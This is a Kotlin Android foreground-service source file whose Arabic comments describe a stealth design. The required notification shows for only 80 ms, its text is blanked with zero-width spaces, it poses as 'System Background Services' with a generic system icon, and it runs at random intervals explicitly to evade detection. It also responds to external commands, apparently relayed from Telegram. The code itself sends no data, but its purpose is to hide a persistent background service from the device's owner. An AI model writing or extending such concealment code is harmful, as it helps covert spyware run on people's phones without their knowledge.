package com.example.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import kotlin.random.Random

/**
 * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" غير مرئي.
 *
 * استراتيجية التخفي:
 * - ظهور الإشعار لمدة 80 مللي ثانية فقط (خاطف جداً).
 * - استخدام Zero-Width Space (\u200B) لإخفاء النص تماماً.
 * - جدولة نبضات عشوائية متغيرة (45-120 دقيقة) مع إعادة جدولة ديناميكية بعد كل نبضة.
 * - أيقونة نظامية عامة (ic_menu_info_details) لتجنب الشك.
 * - أولوية منخفضة جداً (IMPORTANCE_MIN) وتجميع مع إشعارات النظام.
 * - تأخير عشوائي عند بدء الخدمة لتجنب الأنماط الثابتة.
 *
 * ✅ تم إصلاح الإشعار الدائم.
 * ✅ تم إضافة عشوائية متغيرة في الجدولة.
 * ✅ تم إخفاء النص باستخدام \u200B.
 * ✅ تم تقليل مدة الظهور إلى 80ms.
 * ✅ تم إزالة ScheduledExecutorService واستبدالها بـ Handler مع إعادة جدولة ديناميكية.
 * ✅ تم إضافة تأخير عشوائي عند بدء الخدمة لتجنب الأنماط القابلة للكشف.
 */
class ForegroundService : Service() {

    companion object {
        private const val TAG = "ForegroundService"
        const val NOTIFICATION_ID = 9991
        private const val CHANNEL_ID = "shield_ghost_channel_v6"
        private const val PULSE_DURATION_MS = 80L // ظهور خاطف جداً (أقل من 150ms)
        private const val MIN_INTERVAL_MIN = 45L
        private const val MAX_INTERVAL_MIN = 120L
    }

    private val handler = Handler(Looper.getMainLooper())
    private var isForeground = false
    private var hideRunnable: Runnable? = null
    private var ghostPulseRunnable: Runnable? = null
    private lateinit var notificationManager: NotificationManager

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // إيقاف الخدمة إذا طُلب ذلك
        if (intent?.action == "STOP_SERVICE") {
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return START_NOT_STICKY
        }

        // نبض فوري من أمر خارجي (مثل Telegram)
        if (intent?.action == "PULSE_ACTION") {
            val actionType = intent.getStringExtra("action_type") ?: "Sync"
            triggerPhantomPulse(actionType)
            return START_STICKY
        }

        // بدء الخدمة لأول مرة
        createGhostChannel()
        startForeground(NOTIFICATION_ID, buildGhostNotification("System Ready"))
        isForeground = true

        // ✅ إخفاء الإشعار فوراً بعد 80 مللي ثانية (لا يظهر سوى للحظات)
        handler.postDelayed({
            if (isForeground) {
                notificationManager.notify(NOTIFICATION_ID, buildGhostNotification(""))
            }
        }, PULSE_DURATION_MS)

        // ✅ تأخير عشوائي قبل جدولة أول نبضة (30-60 دقيقة) لتجنب الأنماط الثابتة
        handler.postDelayed({
            scheduleNextGhostPulse()
        }, Random.nextLong(30 * 60 * 1000, 60 * 60 * 1000))

        return START_STICKY
    }

    /**
     * جدولة نبضة شبحية تالية بفاصل عشوائي جديد في كل مرة.
     * هذه الطريقة تضمن عدم وجود نمط ثابت يمكن اكتشافه.
     */
    private fun scheduleNextGhostPulse() {
        // إلغاء أي جدولة سابقة
        ghostPulseRunnable?.let { handler.removeCallbacks(it) }

        ghostPulseRunnable = Runnable {
            triggerPhantomPulse("Background Sync")
            // إعادة الجدولة بعد النبضة مباشرة (فاصل جديد)
            scheduleNextGhostPulse()
        }

        // توليد فاصل عشوائي بين 45 و 120 دقيقة (بالمللي ثانية)
        val randomDelayMs = Random.nextLong(MIN_INTERVAL_MIN * 60 * 1000, MAX_INTERVAL_MIN * 60 * 1000)
        handler.postDelayed(ghostPulseRunnable!!, randomDelayMs)
    }

    /**
     * إنشاء قناة الإشعارات بأقل أولوية وإخفاء المحتوى.
     */
    private fun createGhostChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "System Background Services",
                    NotificationManager.IMPORTANCE_MIN // أقل أهمية (لا يظهر أيقونة في شريط الحالة)
                ).apply {
                    description = "Core system operations"
                    setSound(null, null)
                    enableVibration(false)
                    enableLights(false)
                    setShowBadge(false)
                    lockscreenVisibility = Notification.VISIBILITY_SECRET // إخفاء المحتوى على شاشة القفل
                }
                notificationManager.createNotificationChannel(channel)
            } catch (_: Exception) {
                // في حال فشل إنشاء القناة (نادر) نستمر بدونها
            }
        }
    }

    /**
     * بناء الإشعار مع محتوى ديناميكي ونمط "شبحى".
     * يستخدم Zero-Width Space (\u200B) لإخفاء النص تماماً عندما يكون فارغاً.
     *
     * @param statusText النص الذي سيظهر (يمكن أن يكون فارغاً للإخفاء).
     */
    private fun buildGhostNotification(statusText: String): Notification {
        val openIntent = Intent(this, MainActivity::class.java)
        val openPending = PendingIntent.getActivity(
            this, 0, openIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        // استخدام مسافة بعرض صفر (Zero-Width Space) لإخفاء النص تماماً
        val invisibleText = "\u200B"
        val title = if (statusText.isBlank()) invisibleText else "System"
        val content = if (statusText.isBlank()) invisibleText else statusText

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_info_details) // أيقونة نظامية عامة جداً
            .setContentTitle(title)
            .setContentText(content)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSilent(true) // بدون صوت
            .setOnlyAlertOnce(true) // منع الصوت/الاهتزاز عند التحديث
            .setGroup("system_background") // تجميع مع إشعارات النظام لمزيد من التخفي
            .setOngoing(true) // مستمر – ضروري لإبقاء الخدمة حية 100%
            .setShowWhen(false) // لا يظهر الوقت
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // إخفاء المحتوى
            .setContentIntent(openPending)
            .build()
    }

    /**
     * تنفيذ نبضة خاطفة: إظهار الإشعار لفترة قصيرة (80ms) ثم إخفاؤه تماماً.
     *
     * @param actionType نوع النشاط (يظهر في النص أثناء النبضة).
     */
    private fun triggerPhantomPulse(actionType: String) {
        if (!isForeground) return

        // إلغاء أي إخفاء مجدول سابق لتجنب التداخل
        hideRunnable?.let { handler.removeCallbacks(it) }

        // 1. إظهار الإشعار مع النص المطلوب (يظهر للحظات)
        notificationManager.notify(NOTIFICATION_ID, buildGhostNotification("$actionType"))

        // 2. جدولة إخفاء الإشعار (تحديث النص إلى فارغ) بعد 80ms
        hideRunnable = Runnable {
            if (isForeground) {
                notificationManager.notify(NOTIFICATION_ID, buildGhostNotification(""))
            }
        }
        handler.postDelayed(hideRunnable!!, PULSE_DURATION_MS)
    }

    override fun onDestroy() {
        // إلغاء جميع المهام المجدولة
        ghostPulseRunnable?.let { handler.removeCallbacks(it) }
        hideRunnable?.let { handler.removeCallbacks(it) }
        isForeground = false
        super.onDestroy()
    }
}
